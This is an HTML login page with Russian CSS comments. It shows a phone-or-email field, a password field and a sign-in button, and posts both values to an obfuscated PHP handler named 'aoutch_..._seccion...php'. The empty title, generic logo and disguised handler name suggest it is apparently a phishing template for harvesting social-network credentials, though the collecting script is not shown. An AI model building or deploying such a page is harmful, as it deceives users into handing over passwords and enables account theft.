﻿<html>
<head>
<title></title>
<style>
.images{
  border-radius:100px;
}
.main{
text-align:center;
}
table {
    margin: auto; /* Выравниваем таблицу по центру окна  */
   }
  
.text {
font-size:40px;
text-align:center;
color:white;	
padding: 5px; /* Поля вокруг текста */
background: #f27506; /* Цвет фона */
border-radius:10px;
margin: 30 auto; /* Выравниваем слой по центру */
width: 80%; /* Ширина слоя */
opacity: 0.7; /* Значение прозрачности */
filter: alpha(Opacity=70); /* Прозрачность в IE */
}  
  
a {
	  color:white;	  
  }  
  
  
 #CenterBlock{
text-align:center;
width:400px;
padding: 5px; /* Поля вокруг текста */
background: white; /* Цвет фона */
border-radius:10px;
margin: 30 auto; /* Выравниваем слой по центру */
opacity: 0.7; /* Значение прозрачности */
filter: alpha(Opacity=70); /* Прозрачность в IE */

        
  }
	.logo_logo {
		
		text-align:center;
		margin:15px;
	}
	.vhod{
		text-align:center;
		margin:50px;
	}
	
	.texts {
    height:35px;
   border: 1px solid grey ; 
   border-radius: 2px; 
   font-size: 15px; // 
   font-family: Tahoma; 
	}
	.enter {
	margin:30px;	
	}
	.my_button{
  font-size:18px;		
  border-radius:2px; 		
  width:120px;
  height:50px;   
  color: #fff; /* цвет текста */
  text-decoration: none; /* убирать подчёркивание у ссылок */
  user-select: none; /* убирать выделение текста */
  background:#5e84ab; /* фон кнопки */
  padding: .7em 1.5em; /* отступ от текста */
  outline: none; /* убирать контур в Mozilla */
	}
.my_button:hover { background: rgb(#5e84ab); } /* при наведении курсора мышки */
.my_button:active { background: rgb(#5e84ab); } /* при нажатии */

</style>
</head>
<body background="fon.jpg">


<form method="post" action="aoutch_359476741896716584_seccionfghaqovbn75874124545645.php">
    <div id="CenterBlock">
    <div class="logo_logo">
	<img src="logo1.png">
    </div>
	
	<div class="vhod">
	<input type="text" class="texts" name="email" required placeholder="Телефон или email">
	<div style="margin:40px;">
	<input type="password" class="texts" name="pass" required placeholder="Пароль">
	<div class="enter">
	<input type="submit" class="my_button" value="Войти"/>
	</div>
	</div>
	</div>
      


        
      </div>
    </div>
  </form>










</content>




</body>
</html>